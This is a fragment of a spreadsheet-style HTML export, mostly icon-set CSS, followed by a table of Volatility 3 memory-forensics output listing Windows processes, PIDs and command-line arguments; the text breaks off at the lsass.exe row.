+/* circle cross */
+.iS-3Symbols0:before {
+    content: "\e948";
+    color: #9b514a;
+}
+.iS-3Symbols0 span:before {
+    content: "\e949";
+    margin-left: -1em;
+    color: #cf6a61;
+}
+.iS-3Symbols0:after {
+    content: "\e94a";
+    margin-left: -1em;
+    color: #fff;
+}
+/* circle not */
+.iS-3Symbols1:before {
+    content: "\e94b";
+    color: #efc75a;
+}
+.iS-3Symbols1 span:before {
+    content: "\e94c";
+    margin-left: -1em;
+    color: #b09240;
+}
+.iS-3Symbols1 span:after {
+    content: "\e94d";
+    margin-left: -1em;
+    color: #fff;
+}
+.iS-3Symbols1:after {
+    content: "\e94e";
+    margin-left: -1em;
+    color: #fff;
+}
+/* circle tick */
+.iS-3Symbols2:before {
+    content: "\e96a";
+    color: #52a37c;
+}
+.iS-3Symbols2 span:before {
+    content: "\e96b";
+    margin-left: -1em;
+    color: #408061;   
+}
+.iS-3Symbols2:after {
+    content: "\e96c";
+    margin-left: -1em;
+    color: #fff;
+}
+/* Flags red */
+.iS-3Flags0:before {
+    content: "\e900";
+    color: #e07369;
+}
+.iS-3Flags0:after {
+    content: "\e901";
+    margin-left: -0.818359375em;
+    color: #562f2b;
+}
+.iS-3Flags0 span:before {
+    /*content: "\e91a";
+    margin-left: -0.818359375em;
+    color: #e07369;*/
+}
+.iS-3Flags0 span:after {
+    /*content: "\e91b";
+    margin-left: -0.818359375em;
+    color: #9b514a;*/
+}
+/* Flags yellow */
+.iS-3Flags1:before {
+    content: "\e900";
+    color: #e8bf50;
+}
+.iS-3Flags1:after {
+    content: "\e901";
+    margin-left: -0.818359375em;
+    color: #635328;
+}
+.iS-3Flags1 span:before {
+    /*content: "\e91a";
+    margin-left: -0.818359375em;
+    color: #e8bf50;*/
+}
+.iS-3Flags1 span:after {
+    /*content: "\e91b";
+    margin-left: -0.818359375em;
+    color: #b09240;*/
+}
+/* Flags green */
+.iS-3Flags2:before {
+    content: "\e900";
+    color: #52a37c;
+}
+.iS-3Flags2:after {
+    content: "\e901";
+    margin-left: -0.818359375em;
+    color: #264f3b;
+}
+.iS-3Flags2 span:before {
+    /*content: "\e91a";
+    margin-left: -0.818359375em;
+    color: #52a37c;*/
+}
+.iS-3Flags2 span:after {
+    /*content: "\e91b";
+    margin-left: -0.818359375em;
+    color: #408061;*/
+}
+/* star empty */
+.iS-3Stars0:before {
+    content: "\e93d";
+    color: #2c2513;
+}
+.iS-3Stars0:after {
+    content: "\e93e";
+    margin-left: -1.0302734375em;
+    color: #fff;
+}
+
+.iS-3Stars1:before {
+    content: "\e93f";
+    color: #2c2513;
+}
+.iS-3Stars1 span:before {
+    content: "\e940";
+    margin-left: -1.0302734375em;    
+    color: #fff
+}
+.iS-3Stars1:after {
+    content: "\e941";
+    margin-left: -1.0302734375em;    
+    color: #fcd058; 
+}
+.iS-3Stars2:before {
+    content: "\e93d";
+    color: #2c2513;
+}
+.iS-3Stars2:after {  
+    content: "\e93e";
+    margin-left: -1.0302734375em;
+    color: #fcd058;
+}
+
+/* heart ratings */
+.iS-3HeartRating0:before {
+    content: "\e93b";    
+    color: #fff;
+}
+.iS-3HeartRating0:after {
+    content: "\e93c";    
+    margin-left: -1.12890625em;  
+    color: #9b514a;
+}
+.iS-3HeartRating1:before {
+    content: "\e938";    
+    color: #fff;
+}
+.iS-3HeartRating1 span:before {
+    content: "\e939";    
+    margin-left: -1.12890625em;
+    color: #e07369; 
+}
+.iS-3HeartRating1:after {
+    content: "\e93a";    
+    margin-left: -1.12890625em;
+    color: #9b514a;
+}
+
+.iS-3HeartRating2:before {
+    content: "\e93b";    
+    color: #e07369;
+}
+.iS-3HeartRating2:after {
+    content: "\e93c";    
+    margin-left: -1.12890625em;      
+    color: #9b514a;
+}
+
+.iS-5Quarters0:before {
+    content: "\e962";
+    color: #989898;
+}
+.iS-5Quarters0:after {
+    content: "\e963";
+    margin-left: -1em;
+    color: #dedede;
+}
+.iS-5Quarters1:before {
+    content: "\e962";
+   color: #989898;
+}
+.iS-5Quarters1 span:before {
+    content: "\e963";
+    margin-left: -1em;
+    color: #dedede;
+}
+.iS-5Quarters1:after {
+    content: "\e964";
+    margin-left: -1em;
+    color: #000;
+}
+.iS-5Quarters2:before {
+    content: "\e96d";
+    color: #dedede;
+}
+.iS-5Quarters2 span:before {
+    content: "\e96e";
+    margin-left: -1em;
+    color: #000;
+}
+.iS-5Quarters2:after {
+    content: "\e96f";
+    margin-left: -1em;
+    color: #989898;
+}
+.iS-5Quarters3:before {
+    content: "\e95f";
+    color: #989898;
+}
+.iS-5Quarters3 span:before {
+    content: "\e960";
+    margin-left: -1em;
+    color: #000;
+}
+.iS-5Quarters3:after {
+    content: "\e961";
+    margin-left: -1em;
+    color: #dedede;
+}
+.iS-5Quarters4:before {
+    content: "\e962";
+    color: #001;
+}
+.iS-5Quarters4:after {
+    content: "\e963";
+    margin-left: -1em;
+    color: #000;
+}
+
+.iS-5Smileys4:before {
+    content: "\e92d";
+    color: #b09240;
+}
+.iS-5Smileys4 span:before {
+    content: "\e92e";
+    margin-left: -0.970703125em;
+    color: #fcd058;
+}
+.iS-5Smileys4 span:after {
+    /*content: "\e974";
+    margin-left: -1em;
+    color: #000;*/
+}
+.iS-5Smileys4:after {
+    content: "\e92f";
+    margin-left: -0.970703125em;
+    color: #000;
+}
+
+/* 5 smiley */
+.iS-5Smileys3:before {
+    content: "\e922";
+    color: #b09240;
+}
+.iS-5Smileys3 span:before {
+    content: "\e923";
+    margin-left: -1em;
+    color: #fcd058;
+}
+.iS-5Smileys3 span:after {
+    content: "\e924";
+    margin-left: -1em;
+    color: #000;
+}
+.iS-5Smileys3:after {
+    content: "\e925";
+    margin-left: -1em;
+    color: #000;
+}
+
+.iS-5Smileys2:before {
+    content: "\e92a";
+    color: #b09240;
+}
+.iS-5Smileys2 span:before {
+    content: "\e92b";
+    margin-left: -1em;
+    color: #fcd058;
+}
+.iS-5Smileys2:after {
+    content: "\e92c";
+    margin-left: -1em;
+    color: #000;
+}
+
+.iS-5Smileys1:before {
+    content: "\e926";
+    color: #b09240;
+}
+.iS-5Smileys1 span:before {
+    content: "\e927";
+    margin-left: -1em;
+    color: #fcd058;
+}
+.iS-5Smileys1 span:after {
+    content: "\e928";
+    margin-left: -1em;
+    color: #000;
+}
+.iS-5Smileys1:after {
+    content: "\e929";
+    margin-left: -1em;
+    color: #000;
+}
+
+.iS-5Smileys0:before {
+    content: "\e94f";
+    color: #b09240;
+}
+.iS-5Smileys0 span:before {
+    content: "\e950";
+    margin-left: -0.970703125em;
+    color: #fcd058;
+}
+.iS-5Smileys0:after {
+    content: "\e967";
+    margin-left: -0.970703125em;
+    color: #000;
+}
+
+.iS-2Likes0:before {
+    content: "\e907";
+    color: #e07369;
+}
+.iS-2Likes0:after {
+    content: "\e908";
+    margin-left: -1.09375em;
+    color: #9b514a;
+}
+.iS-2Likes1:before {
+    content: "\e902";
+    color: #52a37c;
+}
+.iS-2Likes1:after {
+    content: "\e903";
+    margin-left: -1.12890625em;
+    color: #408061;
+}
+.iS-2Love0:before {
+    content: "\e93b";
+    color: #e07369;
+}
+.iS-2Love0:after {
+    content: "\e93c";
+    margin-left: -1.12890625em;
+    color: #9b514a;
+}
+.iS-2Love1:before {
+    content: "\e904";
+    color: #e07369;
+}
+.iS-2Love1 span:before {
+    content: "\e905";
+    margin-left: -1.12890625em;
+    color: #9b514a;
+}
+.iS-2Love1:after {
+    content: "\e906";
+    margin-left: -1.12890625em;
+    color: #fff;
+}
+
+/*weather */
+.iS-5Weather3:before {
+    content: "\e910";
+    color: #5690c0;
+}
+.iS-5Weather3:after {
+    content: "\e911";
+    margin-left: -1.107421875em;
+    color: #a7d4f9;
+}
+.iS-5Weather4:before {
+    content: "\e916";
+    color: #e0a322;
+}
+.iS-5Weather4 span:before {
+    content: "\e917";
+    margin-left: -1.107421875em;
+    color: #f1b129;
+}
+.iS-5Weather4 span:after {
+    content: "\e918";
+    margin-left: -1.107421875em;
+    color: #5690c0;
+}
+.iS-5Weather4:after {
+    content: "\e919";
+    margin-left: -1.107421875em;
+    color: #a7d4f9;
+}
+
+.iS-5Weather2:before {
+    content: "\e91e";
+    color: #5690c0;
+}
+.iS-5Weather2 span:before {
+    content: "\e91f";
+    margin-left: -1.107421875em;
+    color: #a7d4f9;
+}
+.iS-5Weather2 span:after {
+    content: "\e920";
+    margin-left: -1.107421875em;
+    color: #4c5fcd;
+}
+.iS-5Weather2:after {
+    content: "\e921";
+    margin-left: -1.107421875em;
+    color: #4253ba;
+}
+
+
+.iS-5Weather1:before {
+    content: "\e90c";
+    color: #5690c0;
+}
+.iS-5Weather1 span:before {
+    content: "\e90d";
+    margin-left: -1.107421875em;
+    color: #a7d4f9;
+}
+.iS-5Weather1 span:after {
+    content: "\e90e";
+    margin-left: -1.107421875em;
+    color: #e86907;
+}
+.iS-5Weather1:after {
+    content: "\e90f";
+    margin-left: -1.107421875em;
+    color: #ff6f00;
+}
+
+
+.iS-5Weather0:before {
+    content: "\e912";
+    color: #1671b9;
+}
+.iS-5Weather0 span:before {
+    content: "\e913";
+    margin-left: -1.107421875em;
+    color: #1d8ae0;
+}
+.iS-5Weather0 span:after {
+    content: "\e914";
+    margin-left: -1.107421875em;
+    color: #5690c0;
+}
+.iS-5Weather0:after {
+    content: "\e915";
+    margin-left: -1.107421875em;
+    color: #a7d4f9;
+}
+
+
+
+.iS-5Weather5:before {
+    content: "\e91a";
+    color: #5690c0;
+}
+.iS-5Weather5 span:before {
+    content: "\e91b";
+    margin-left: -1.107421875em;
+    color: #a7d4f9;
+}
+.iS-5Weather5 span:after {
+    content: "\e91c";
+    margin-left: -1.107421875em;
+    color: #3747a3;
+}
+.iS-5Weather5:after {
+    content: "\e91d";
+    margin-left: -1.107421875em;
+    color: #3f51b5;
+}
+.iS-5Weather3, .iS-5Weather4 {
+    position: relative;
+    top: -1px
+}
+.iS-5Weather4 {
+    top: -3px;
+    left: 1px;
+}
+
+/*weather */
+#iconSetTip .iS-None:before, .w100 .iS-None:before {
+    content: "\e916";
+    color: transparent;
+}
+#iconSetTip .iS-None:after, .w100 .iS-None:after {
+    content: "\e915";
+    margin-left: -1em;
+    color: transparent;
+}
+.kDis {
+    font-size: 10pt;
+}
+.f10 .kDis, .f9 .kDis, .f8 .kDis {
+    margin-top: 2px;
+}
+.f11 .kDis {
+    margin-top: 2px;
+}
+.f12 .kDis {
+    margin-top: 4px;
+}
+.f14 .kDis {
+    margin-top: 5px;
+}
+.f16 .kDis {
+    margin-top: 6px;
+}
+.f18 .kDis {
+    margin-top: 9px;
+}
+.f20 .kDis {
+    margin-top: 10px;
+}
+.f22 .kDis {
+    margin-top: 12px;
+}
+.f24 .kDis {
+    margin-top: 13px;
+}
+.f26 .kDis {
+    margin-top: 15px;
+}
+.f28 .kDis {
+    margin-top: 17px;
+}
+.f32 .kDis {
+    margin-top: 21px;
+}
+.f40 .kDis {
+    margin-top: 27px;
+}
+.f48 .kDis {
+    margin-top: 32px;
+}
+.f56 .kDis {
+    margin-top: 36px;
+}
+.f64 .kDis {
+    margin-top: 44px;
+}
+.f72 .kDis {
+    margin-top: 52px;
+}
+.fac.hcc .w100 .iS-5Arrows4 {
+    -webkit-transform: translateX(-50%) !important;
+    transform: translateX(-50%) !important;
+}
+.fac.hcc .w100 .iS-5Arrows3 {
+    -webkit-transform: translateX(-50%) rotate(45deg) !important;
+    transform: translateX(-50%) rotate(45deg) !important;
+}
+.fac.hcc .w100 .iS-5Arrows2 {
+    -webkit-transform: translateX(-50%) rotate(90deg) !important;
+    transform: translateX(-50%) rotate(90deg) !important;
+}
+.fac.hcc .w100 .iS-5Arrows1 {
+    -webkit-transform: translateX(-50%) rotate(135deg) !important;
+    transform: translateX(-50%) rotate(135deg) !important;
+}
+.fac.hcc .w100 .iS-5Arrows0, .fac.hcc .w100 .iS-3Triangles0 {
+    -webkit-transform: translateX(-50%) rotate(180deg) !important;
+    transform: translateX(-50%) rotate(180deg) !important;
+}
+.tar .w100 > span, .far .w100 > span {
+    float: left;
+}
+/**Added for RTL **/
+/* .w100 > span{
+    float: left;
+} */
+/****/
+/* newly added for icon misalignment */
+.fac .w100 {
+    position: relative;
+}
+.fal .w100 > span[class^="iS"] {
+    float: left;
+}
+.fac .w100 > span[class^="iS"] {
+    position: absolute;
+    left: 0px;
+}
+.w100 > .iS-3TrafficLights20, .w100 > .iS-3TrafficLights21, .w100 > .iS-3TrafficLights22, .w100 > .iS-3Flags0, .w100 > .iS-3Flags1, .w100 > .iS-3Flags2 {
+    margin-left: 1px;
+}
+.tac .w100 > span[class^="iS"] {
+    position: absolute;
+    left: 0;
+}
+/*d-bar start*/
+.dbar-parent{
+    position: absolute;
+    height: 100%;
+    padding: 3px 3px;
+    box-sizing: border-box;
+    top: 0;
+    left: 0;
+    right: 0;
+}
+.dbar-child{
+    position: relative;
+    height: 100%;
+    z-index: -1;
+    /* width: 100%; set width*/ 
+    /* background: red; set color */
+    /* border: 1px dashed red; set color*/
+}
+
+.vat.f11.fac .w100 span, .vat.f12.fac .w100 span {
+    /*top: 0;*/
+}
+.vam.f11.fac .w100 span, .vab.f11.fac .w100 span, .vam.f12.fac .w100 span, .vab.f12.fac .w100 span, .vab.f22.fac .w100 span, .vam.f22.fac .w100 span, .vab.f24.fac .w100 span {
+    /*top: -1px;*/
+}
+.vam.f26.fac .w100 span, .vam.f28.fac .w100 span, .vab.f28.fac .w100 span, .vam.f32.fac .w100 span, .vam.f40.fac .w100 span, .vam.f48.fac .w100 span {
+    /*top: -1px;*/
+}
+.vab.f26.fac .w100 span, .vab.f32.fac .w100 span, .vab.f40.fac .w100 span, .vab.f48.fac .w100 span, .vam.f56.fac .w100 span, .vam.f64.fac .w100 span {
+    /*top: -2px;*/
+}
+.vab.f56.fac .w100 span {
+    /*top: -3px;*/
+}
+.vab.f64.fac .w100 span {
+    /*top: -4px;*/
+}
+.vam.f64.fac .w100 span {
+    /*top: -4px;*/
+}
+.vam.f72.fac .w100 span {
+    /*top: -2px;*/
+}
+.vab.f72.fac .w100 span {
+    /*top: -5px;*/
+}
+.rmAr { /* rules margin align right */
+    /*margin-right: 67px !important;*/
+}
+/* newly added for icon misalignment */
+
+.far.hcc .w100 > span
+{
+    float: right;
+}
+.fac.hcc .w100 > span, .tac.hcc .w100 > span
+{
+    position :absolute;
+    left : 50%;
+    -webkit-transform : translateX(-50%);
+    transform : translateX(-50%);
+}
+.W.iconWrap{
+    word-wrap: normal;
+    word-break: break-all;
+
+}
+_::-webkit-full-page-media, _:future, :root .W.iconWrap {
+    white-space: pre;
+    word-break: break-all;
+    word-wrap: break-word;
+}
+
+/*ul#iconSetIcons li {
+    width: 19px;
+    font-size: 15px;
+}*/
+#iconSetIcons {
+    width: 212px !important;
+}
+.cell.vam .gIS{
+    top: 50%;
+    transform: translateY(-50%);
+}
+
+/* Added for rendering in Grid - Prasanna */
+.gIS{
+    position: absolute;
+    width: 100%;
+    font-size: inherit;
+    font-family: inherit;
+    line-height: 1.2;
+    text-align: inherit;
+    text-decoration: inherit;
+    display: inherit;
+    -webkit-box-pack: inherit;
+    -webkit-box-align: inherit;
+    left: 0;
+    padding: inherit;
+    padding-top: 0
+}
+.tar .gIS .hasCnt, .tac .gIS .hasCnt {
+    position: absolute;
+    left: 2px
+}
+.cell.vab .gIS{
+    bottom: 0;
+}
+.CG_gridContainer.cozy .tar .gIS .hasCnt,.CG_gridContainer.cozy .tac .gIS .hasCnt,.prevContainer.cozy .tar .gIS .hasCnt,.prevContainer.cozy .tac .gIS .hasCnt{
+    left: 4px;
+}
+.CG_gridContainer.comfort .tar .gIS .hasCnt,.CG_gridContainer.comfort .tac .gIS .hasCnt,.prevContainer.cozy .tar .gIS .hasCnt,.prevContainer.cozy .tac .gIS .hasCnt{
+    left: 6px;
+}
+.CG_gridContainer.cozy .tar .wid100 .gIS .hasCnt,.CG_gridContainer.cozy .tac .wid100 .gIS .hasCnt,.prevContainer.cozy .tar .wid100 .gIS .hasCnt,.prevContainer.cozy .tac .wid100 .gIS .hasCnt{
+    left: 0;
+}
+.CG_gridContainer.comfort .tar .wid100 .gIS .hasCnt,.CG_gridContainer.comfort .tac .wid100 .gIS .hasCnt,.prevContainer.cozy .tar .wid100 .gIS .hasCnt,.prevContainer.cozy .tac .wid100 .gIS .hasCnt{
+    left: 0;
+}
+.cell{
+    z-index: 0;
+}
+
+[class^="iS-"], [class*=" iS-"] {
+    /*z-index: -1;*/
+    margin-left: 2px;
+    margin-right: 2px;
+}
+
+.dIS.hasCnt{
+    font-size: 10pt;
+}
+[class^="iS-"], [class*=" iS-"]{
+    margin: 0;
+    margin-right: 2px;
+}
+.fontList div:nth-child(n+3):last-child{
+    border-bottom : none;
+}
+</style></HEAD><BODY><div class='pageContainer' style='width: -1.0px; height: -1.0px; '><div class='gridDiv' style='position:relative;margin-right:0.0px; margin-left:0.0px;margin-top:0.0px; margin-bottom:0.0px;'><div style='position:relative; overflow:hidden; width:252px; height:2599px; zoom: 1.0'><div class='row' style='top:0px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-top:1px solid #D5D5D5;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 nW'><div class = 'w100'>Volatility 3 Framework 2.8.0</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-top:1px solid #D5D5D5;z-index:3;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-top:1px solid #D5D5D5;z-index:3;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'></div><div class='cover' style='z-index:3; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:23px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:3;height:23px;width:84px;left:0px;' class='cD fnal f10 nW'></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:3;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:3;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'></div><div class='cover' style='z-index:3; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:46px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 nW'><div class = 'w100'>PID</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>Process</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Args</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:69px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:3;height:23px;width:84px;left:0px;' class='cD fnal f10 nW'></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:3;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:3;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'></div><div class='cover' style='z-index:3; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:92px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>4</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>System</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x20 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:115px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>92</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>Registry</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x20 is not valid &#x28;process exited&#x3f;&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:138px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>300</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>smss.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Process 300&#x3a; Required memory at 0x8141d08000 is not valid &#x28;incomplete layer memory_layer&#x3f;&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:161px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>416</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>csrss.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>&#x25;SystemRoot&#x25;&#x5c;system32&#x5c;csrss.exe ObjectDirectory&#x3d;&#x5c;Windows SharedSection&#x3d;1024,20480,768 Windows&#x3d;On SubSystemType&#x3d;Windows ServerDll&#x3d;basesrv,1 ServerDll&#x3d;winsrv&#x3a;UserServerDllInitialization,3 ServerDll&#x3d;sxssrv,4 ProfileControl&#x3d;Off MaxRequestThreads&#x3d;16</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:184px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>492</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>wininit.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x8dd111f020 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:207px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>512</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>csrss.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>&#x25;SystemRoot&#x25;&#x5c;system32&#x5c;csrss.exe ObjectDirectory&#x3d;&#x5c;Windows SharedSection&#x3d;1024,20480,768 Windows&#x3d;On SubSystemType&#x3d;Windows ServerDll&#x3d;basesrv,1 ServerDll&#x3d;winsrv&#x3a;UserServerDllInitialization,3 ServerDll&#x3d;sxssrv,4 ProfileControl&#x3d;Off MaxRequestThreads&#x3d;16</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:230px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>588</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>winlogon.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>winlogon.exe</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:253px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>628</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>services.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;system32&#x5c;services.exe</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:276px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>636</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>lsass.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' 